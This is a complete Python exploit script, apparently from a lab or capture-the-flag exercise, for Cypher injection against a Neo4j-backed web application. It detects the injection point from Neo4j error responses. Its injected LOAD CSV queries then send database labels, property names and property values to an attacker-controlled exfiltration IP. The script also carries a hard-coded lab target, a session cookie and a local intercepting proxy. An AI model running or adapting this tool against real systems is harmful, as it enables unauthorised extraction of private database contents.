import argparse
import requests
import urllib
import sys

headers = {
    'Host': '192.168.17.158:3030',
    'User-Agent': 'curl/8.5.0',
    'Accept': '*/*',
    'Connection': 'close',
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}

cookies = {
    'x': '17ab96bd8ffbe8ca58a78657a918558'
}



def inject_payload(target, exfil_ip, payload):
    types = ["asdf'", "-1"]
    actual_payload = types[0] + payload
    url = f"{target + urllib.parse.quote(actual_payload, safe='')}"

    response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)

    if response.status_code == 200 and "Neo4jError".encode('utf-8') in response.content:
        actual_payload = types[1] + payload
        url = f"{target + urllib.parse.quote(actual_payload, safe='')}"

        response = requests.get(url, headers=headers, verify=False, proxies=proxies, cookies=cookies)
        print("Injecting in ID ... Check your listener")
    else:
        print("Injecting in Properties ... Check your listener")

def dump_labels(target, exfil_ip):
    payload = f" OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM 'http://{exfil_ip}/?label='+label as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload)

def dump_properties(target, exfil_ip, label):
    payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload)

def dump_values(target, exfil_ip, label):
    payload = f" OR 1=1 WITH 1 as a MATCH (x:{label}) UNWIND keys(x) as p LOAD CSV FROM 'http://{exfil_ip}/?keys=' + p +'='+replace(toString(x[p]),' ','') as l RETURN 0 as _0 //"
    inject_payload(target, exfil_ip, payload)

def main():
    parser = argparse.ArgumentParser(description="Inject payloads into Neo4j")
    parser.add_argument("target", help="Target URL")
    parser.add_argument("exfil_ip", help="Exfiltration IP")

    args = parser.parse_args()

    print("Dumping Labels")
    dump_labels(args.target, args.exfil_ip)

    label = input("Enter Label: ")

    print("Dumping Properties")
    dump_properties(args.target, args.exfil_ip, label)

    print("Dumping Value of Properties")
    dump_values(args.target, args.exfil_ip, label)

if __name__ == '__main__':
    main()
